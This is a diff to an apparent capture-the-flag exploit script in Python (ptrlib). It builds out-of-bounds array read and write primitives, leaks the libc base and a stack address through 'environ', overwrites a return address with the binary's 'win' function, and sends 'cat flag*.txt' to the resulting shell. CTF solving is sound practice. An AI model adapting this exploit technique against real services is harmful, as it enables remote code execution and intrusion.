@@ -2,25 +2,32 @@ from ptrlib import *
 import time
 import os
 
+def read(index):
+    sock.sendlineafter("> ", "1")
+    sock.sendlineafter("index: ", str(index))
+    return int(sock.recvline())
+
+def write(index, value):
+    sock.sendlineafter("> ", "2")
+    sock.sendlineafter("index: ", str(index))
+    sock.sendlineafter("value: ", str(value))
+
 HOST = os.getenv("HOST", "localhost")
 PORT = int(os.getenv("PORT", "9003"))
 
 elf = ELF("../distfiles/chall")
-libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+libc = ELF("../distfiles/libc.so.6")
+#sock = Process("../distfiles/chall")
 sock = Socket(HOST, PORT)
 
-sock.sendlineafter("index: ", "-4")
-libc.base = int(sock.recvline(), 16) - libc.symbol('_IO_2_1_stdout_')
-#addr_canary = libc.base + 0x39a768
-addr_canary = libc.base - 0x2898
+def ofs(addr):
+    return (addr - elf.symbol('array')) // 8
 
-ofs = (addr_canary - elf.symbol("array")) // 8
-sock.sendlineafter("index: ", str(ofs))
-sock.sendlineafter("value: ", 0x4141414141414141)
+libc.base = read(-11) - libc.symbol('atoll')
+addr_stack = read(ofs(libc.symbol('environ')))
+logger.info("stack = " + hex(addr_stack))
 
-payload  = b"A"*0x38
-payload += p64(elf.symbol("win"))
-sock.sendlineafter("index: ", payload)
+write(ofs(addr_stack - 0x120), elf.symbol('win'))
 
 time.sleep(0.5)
 sock.sendline("cat flag*.txt")
